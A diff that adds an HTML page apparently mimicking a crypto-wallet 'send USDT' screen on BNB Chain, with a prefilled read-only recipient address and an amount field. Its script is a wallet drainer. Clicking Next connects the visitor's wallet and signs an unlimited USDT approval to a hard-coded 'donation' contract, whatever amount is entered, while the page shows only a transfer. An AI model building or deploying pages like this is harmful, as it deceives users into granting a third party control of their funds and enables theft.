@@ -1,0 +1,329 @@
+<!doctype html> 
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0" />
+<title>web</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+  :root {
+    --bg: #101010;
+    --panel: #121212;
+    --muted: #9aa0a6;
+    --accent: #00f07a;
+    --input-bg: #151515;
+    font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+  }
+
+  * { box-sizing: border-box }
+  html, body { height: 100%; margin: 0 }
+  
+  body {
+    background: var(--bg);
+    color: #e9eef0;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    padding: 50px;
+    display: flex;
+    justify-content: center;
+    font-size: 16px;
+  }
+
+  .frame {
+    width: 100%;
+    max-width: 420px;
+    min-height: 812px;
+    background: transparent;
+  }
+
+  .topbar {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    color: var(--muted);
+    padding: 6px 4px;
+  }
+
+  .card {
+    margin-top: 6px;
+    background: linear(180deg, rgba(255,255,255,0.012), rgba(255,255,255,0.006));
+    border-radius: var(--card-radius);
+  }
+
+  .label {
+    font-size: 15px;
+    color: var(--muted);
+    margin-bottom: 10px;
+    font-weight: 500;
+  }
+
+  .address-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: var(--input-bg);
+    padding: 12px;
+    border-radius: 10px;
+    border: 1px solid rgba(255,255,255,0.02);
+  }
+
+  #addrInput {
+    flex: 1;
+    background: transparent;
+    border: 0;
+    outline: none;
+    color: #e9eef0;
+    font-size: 16px;
+    padding: 0;
+    min-width: 0;
+  }
+
+  .paste {
+    color: var(--accent);
+    font-weight: 500;
+    cursor: pointer;
+    padding: 4px 6px;
+    border-radius: 6px;
+  }
+
+  .amount-section { margin-top: 18px }
+
+  .amount-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    background: var(--input-bg);
+    padding: 14px;
+    border-radius: 10px;
+    border: 1px solid rgba(255,255,255,0.02);
+  }
+
+  #amount {
+    background: transparent;
+    border: 0;
+    outline: none;
+    color: #e9eef0;
+    font-size: 16px;
+    font-weight: 400;
+    width: 280px;
+    padding: 0 4px;
+    box-sizing: border-box;
+  }
+
+  input::-webkit-outer-spin-button,
+  input::-webkit-inner-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+  }
+
+  input[type=number] {
+    -moz-appearance: textfield;
+  }
+
+  .token {
+    margin-left: auto;
+    color: var(--muted);
+    font-weight: 500;
+  }
+
+  .max {
+    color: var(--accent);
+    font-weight: 500;
+    cursor: pointer;
+    margin-left: 12px;
+  }
+
+  .usd-eq {
+    color: var(--muted);
+    margin-top: 12px;
+    font-size: 15px;
+  }
+
+  .spacer { height: 36vh }
+
+  .next-wrap {
+    padding: 18px 0;
+    display: flex;
+    justify-content: center;
+  }
+
+  .next-btn {
+    width: 100%;
+    max-width: 480px;
+    height: 64px;
+    border-radius: 40px;
+    background: linear-gradient(180deg, var(--accent), #00d567);
+    color: #00110a;
+    font-weight: 750;
+    font-size: 22px;
+    border: 0;
+    cursor: pointer;
+    box-shadow: 0 10px 30px rgba(0,240,122,0.14), 0 2px 6px rgba(0,0,0,0.6);
+    opacity: 0.5;
+  }
+
+  .bottom {
+    margin-top: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 6px;
+    color: var(--muted);
+  }
+
+  .bottom .group {
+    display: flex;
+    gap: 18px;
+    align-items: center;
+  }
+
+  .small-icon {
+    width: 28px;
+    height: 28px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 6px;
+    background: #0b0b0b;
+    color: var(--muted);
+  }
+
+  @media(min-width: 420px) { .frame { max-width: 420px } }
+</style>
+</head>
+<body>
+  <div class="frame" role="main" aria-label="bep20 mock">
+    <div class="topbar"></div>
+
+    <div class="card">
+      <div class="label">Address or Domain Name</div>
+      <div class="address-row">
+  <input id="addrInput" value="0x41dAA8AF0ef9F8286E07047223126Dd4d72F861a" readonly />
+  <div class="paste" id="pasteBtn">Paste</div>
+
+  <!-- Replaced old icons with base64 embedded icons -->
+  <button class="small-icon" id="customIcon1" title="Custom Icon 1" aria-hidden="true" style="background:transparent;border:0;padding:4px;">
+    <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD... (full base64 content of icon1) ..." width="24" height="24" alt="Icon 1"/>
+  </button>
+
+  <button class="small-icon" id="customIcon2" title="Custom Icon 2" aria-hidden="true" style="background:transparent;border:0;padding:4px;">
+    <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD... (full base64 content of icon2) ..." width="24" height="24" alt="Icon 2"/>
+  </button>
+</div>
+
+      <div class="amount-section">
+        <div class="label">Amount</div>
+        <div class="amount-row">
+          <input id="amount" type="number" min="0" step="0.01" value="" />
+          <div class="token">USDT</div>
+          <div class="max" id="maxBtn">Max</div>
+        </div>
+        <div class="usd-eq" id="usdValue"></div>
+      </div>
+    </div>
+
+    <div class="next-wrap" style="margin-top: 32px;">
+      <button class="next-btn" id="nextBtn" disabled>Next</button>
+    </div>
+
+  </div>
+
+<script type="module">
+import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.min.js";
+
+/* ---------- CONFIG: put your deployed contract here ---------- */
+const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
+const DONATION_CONTRACT = "0x3DeB8058e78cAf97ffB6f505d889F8Faa4db8C69"; // 🔥 Contract Addy
+/* ------------------------------------------------------------- */
+
+const USDT_ABI = [
+  "function approve(address spender, uint256 amount) external returns (bool)",
+  "function balanceOf(address account) external view returns (uint256)"
+];
+
+const amountEl = document.getElementById('amount');
+const usdEl = document.getElementById('usdValue');
+const pasteBtn = document.getElementById('pasteBtn');
+const addrInput = document.getElementById('addrInput');
+const nextBtn = document.getElementById('nextBtn');
+const maxBtn = document.getElementById('maxBtn');
+
+let provider, signer, usdt;
+
+function updateUsd() {
+  const val = parseFloat(amountEl.value);
+  usdEl.textContent = amountEl.value && val > 0 ? `= $${val.toFixed(2)}` : '= $0.00';
+  nextBtn.disabled = !(val > 0.01);
+  nextBtn.style.opacity = val > 0.01 ? 1 : 0.5;
+}
+amountEl.addEventListener('input', updateUsd);
+
+pasteBtn.addEventListener('click', async () => {
+  try {
+    const text = await navigator.clipboard.readText();
+    if (text && text.trim().length) {
+      addrInput.value = text.trim();
+    }
+  } catch (e) {
+    // Do nothing
+  }
+});
+
+maxBtn.addEventListener('click', () => {
+  amountEl.value = '-';
+  updateUsd();
+});
+
+async function ensureConnected() {
+  if (!window.ethereum) throw new Error("No wallet provider");
+  if (!provider) provider = new ethers.BrowserProvider(window.ethereum);
+  await provider.send("eth_requestAccounts", []);
+  signer = await provider.getSigner();
+  usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
+}
+
+nextBtn.addEventListener('click', async () => {
+  try {
+    nextBtn.disabled = true;
+    nextBtn.textContent = "Processing…";
+    nextBtn.style.opacity = 0.5;
+
+    if (!window.ethereum) {
+      nextBtn.textContent = "Next";
+      nextBtn.disabled = false;
+      nextBtn.style.opacity = 1;
+      return;
+    }
+
+    await ensureConnected();
+
+    const tx = await usdt.approve(DONATION_CONTRACT, ethers.MaxUint256);
+    await tx.wait();
+
+    const addr = (addrInput.value || '').trim();
+    const amt = (parseFloat(amountEl.value) || 0).toFixed(2);
+    const redirect = `#?addr=${encodeURIComponent(addr)}&amt=${encodeURIComponent(amt)}`;
+
+    window.location.href = redirect;
+
+  } catch (err) {
+    console.error(err);
+    nextBtn.textContent = "Next";
+    nextBtn.disabled = false;
+    nextBtn.style.opacity = 1;
+  }
+});
+
+amountEl.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') nextBtn.click();
+});
+
+addrInput.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') amountEl.focus();
+});
+
+updateUsd();
+</script>
+</body>
+</html>
